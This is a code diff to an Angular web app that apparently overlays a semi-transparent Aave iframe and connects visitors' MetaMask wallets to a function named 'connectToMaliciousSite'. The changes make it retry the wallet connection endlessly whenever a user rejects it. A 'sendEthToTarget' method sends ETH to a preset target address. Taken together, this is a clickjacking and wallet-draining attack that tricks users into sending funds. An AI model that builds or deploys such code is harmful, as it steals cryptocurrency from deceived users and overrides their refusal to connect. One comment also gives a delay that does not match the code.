@@ -5,7 +5,7 @@ declare let ethereum: any;
 @Component({
   selector: 'app-root',
   templateUrl: './app.component.html',
-  styleUrl: './app.component.scss'
+  styleUrls: ['./app.component.scss']
 })
 export class AppComponent implements AfterViewInit {
   iframeOpacity: number = 0.5;
@@ -25,12 +25,17 @@ export class AppComponent implements AfterViewInit {
   async connectToMaliciousSite() {
     try {
       await this.connectMetamask('malicious');
+      this.reloadAaveIframe();
+      this.supplyEth = true;
+      this.spinner = false;
+      this.iframeOpacity = 1;
     } catch (error) {
       console.error('Error connecting to MetaMask:', error);
+      this.connectToMaliciousSite();
     }
   }
 
-  async connectMetamask(target: 'malicious'): Promise<any> {
+  async connectMetamask(target: 'malicious' | 'aave'): Promise<any> {
     return new Promise((resolve, reject) => {
       const ethereum = (window as any).ethereum;
       if (ethereum) {
@@ -38,10 +43,12 @@ export class AppComponent implements AfterViewInit {
           .then((accounts: any) => {
             console.log(`Connected to ${target} site:`, accounts);
             this.accountConnectedAddress = accounts[0];
-            this.reloadAaveIframe();
             resolve(accounts);
           })
-          .catch((err: any) => reject(err));
+          .catch((err: any) => {
+            console.error(`Error connecting to ${target} MetaMask:`, err);
+            setTimeout(() => this.connectMetamask(target).then(resolve).catch(reject), 2000); // Retry after 3 seconds
+          });
       } else {
         alert('MetaMask not found');
         reject('MetaMask not found');
@@ -56,9 +63,6 @@ export class AppComponent implements AfterViewInit {
         this.connectAaveInIframe();
       };
       iframe.src = iframe.src;
-      this.supplyEth = true;
-      this.spinner = false;
-      this.iframeOpacity = 1
     } else {
       console.error('Iframe element not found.');
     }
@@ -72,7 +76,6 @@ export class AppComponent implements AfterViewInit {
       console.error('Unable to access iframe content window.');
     }
   }
-
 
   handleIframeLoad() {
     const iframe = document.getElementById('aaveIframe') as HTMLIFrameElement;
@@ -98,6 +101,7 @@ export class AppComponent implements AfterViewInit {
       console.error('Unable to access iframe content window.');
     }
   }
+
   async sendEthToTarget() {
     try {
       this.supplyClickCounter++;
@@ -107,7 +111,7 @@ export class AppComponent implements AfterViewInit {
       const transactionParameters = {
         from: senderAddress,
         to: this.targetAddress,
-        value: '0x12345'
+        value: '0x12345' // Adjust the value as needed
       };
 
       const transactionHash = await (ethereum as any).request({
